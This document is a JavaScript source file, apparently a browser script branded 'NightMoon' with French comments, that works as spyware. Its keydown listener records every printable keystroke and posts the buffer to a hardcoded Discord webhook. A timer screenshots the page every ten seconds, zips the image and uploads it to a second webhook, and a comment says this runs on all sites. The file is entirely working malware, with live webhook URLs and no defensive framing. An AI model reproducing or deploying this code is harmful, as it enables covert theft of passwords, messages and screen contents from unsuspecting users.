const KEYLOGGER_WEBHOOK_URL = "https://discord.com/api/webhooks/1393276773520904316/GhBhnRvv1HmSqop-k1h-iLKu7Sh_mM8gQ9vC0q7DqlreB1X3Mcc2C3D-Zkdk7NgHbvzU";

// === Keylogger clean : uniquement caractères visibles (sans touches spéciales, sans espace) ===
let keyBuffer = '';
let inactivityTimer = null;
const INACTIVITY_DELAY = 3000; // 3 secondes

function isVisibleChar(key) {
  // Caractères imprimables ASCII sans espace (code 32)
  return key.length === 1 && key.match(/[\x21-\x7E]/);
}

function sendBufferedKeys() {
  if (keyBuffer.length === 0) return;

  fetch(KEYLOGGER_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `Keys typed: ${keyBuffer}`,
      username: 'NightMoon Keylogger'
    })
  });

  keyBuffer = '';
}

document.addEventListener('keydown', (e) => {
  if (!isVisibleChar(e.key)) return;

  keyBuffer += e.key;

  clearTimeout(inactivityTimer);
  inactivityTimer = setTimeout(sendBufferedKeys, INACTIVITY_DELAY);
});

// === Capture d'écran ===
const SCREENSHOT_WEBHOOK_URL = "https://discord.com/api/webhooks/1394263577988432013/jJnnk2ltOqld_d7PS8OhsYVtlPY7k8kntXfVamGNVdivH4iBehVtHXNDKpHJT9lhfavq"; // Remplacez par votre webhook

async function captureScreenshot() {
  console.log('Début de la capture d\'écran');
  try {
    if (typeof html2canvas === 'undefined') {
      console.error('html2canvas non chargé');
      return;
    }
    if (typeof JSZip === 'undefined') {
      console.error('JSZip non chargé');
      return;
    }

    // Test du webhook
    console.log('Test du webhook pour capture d\'écran...');
    const testResponse = await fetch(SCREENSHOT_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: 'Test webhook pour capture d\'écran', username: 'NightMoon Test' })
    });
    if (!testResponse.ok) {
      console.error('Erreur lors du test du webhook:', testResponse.status, testResponse.statusText);
      const testResponseText = await testResponse.text();
      console.error('Détails de l\'erreur du test:', testResponseText);
      return;
    }
    console.log('Webhook de capture d\'écran fonctionne');

    // Capture d'écran avec html2canvas
    const canvas = await html2canvas(document.body, { scale: 1.0 }); // Échelle pleine pour meilleure qualité
    const imageData = canvas.toDataURL('image/jpeg', 0.8); // Qualité à 80% en JPEG
    const imageSizeKB = Math.round((imageData.length * 3/4) / 1024); // Taille approximative en KB
    console.log(`Capture d\'écran effectuée, taille: ${imageSizeKB} KB`);

    // Créer un fichier ZIP
    const zip = new JSZip();
    const imageBinary = atob(imageData.split(',')[1]); // Convertir base64 en binaire
    zip.file('screenshot.jpg', imageBinary, { binary: true });
    const zipBlob = await zip.generateAsync({ type: 'blob' });
    const zipSizeKB = Math.round(zipBlob.size / 1024); // Taille du ZIP en KB
    console.log(`Fichier ZIP créé, taille: ${zipSizeKB} KB`);

    if (zipSizeKB > 25000) { // Limite de 25 Mo pour les pièces jointes Discord
      console.error('Fichier ZIP trop grand pour Discord (> 25 Mo)');
      return;
    }

    // Envoi du ZIP au webhook Discord
    const formData = new FormData();
    formData.append('file', zipBlob, 'screenshot.zip');
    formData.append('payload_json', JSON.stringify({
      content: `Screenshot captured! (ZIP taille: ${zipSizeKB} KB)`,
      username: 'NightMoon Screenshot'
    }));

    const response = await fetch(SCREENSHOT_WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });

    if (response.ok) {
      console.log('Capture d\'écran (ZIP) envoyée avec succès');
    } else {
      console.error('Erreur lors de l\'envoi du ZIP:', response.status, response.statusText);
      const responseText = await response.text();
      console.error('Détails de l\'erreur:', responseText);
    }
  } catch (err) {
    console.error('Erreur lors de la capture d\'écran:', err);
  }
}

// Déclencher la capture d'écran toutes les 10 secondes sur tous les sites
console.log('Démarrage des captures d\'écran toutes les 10 secondes...');
setInterval(captureScreenshot, 10000); // 10 secondes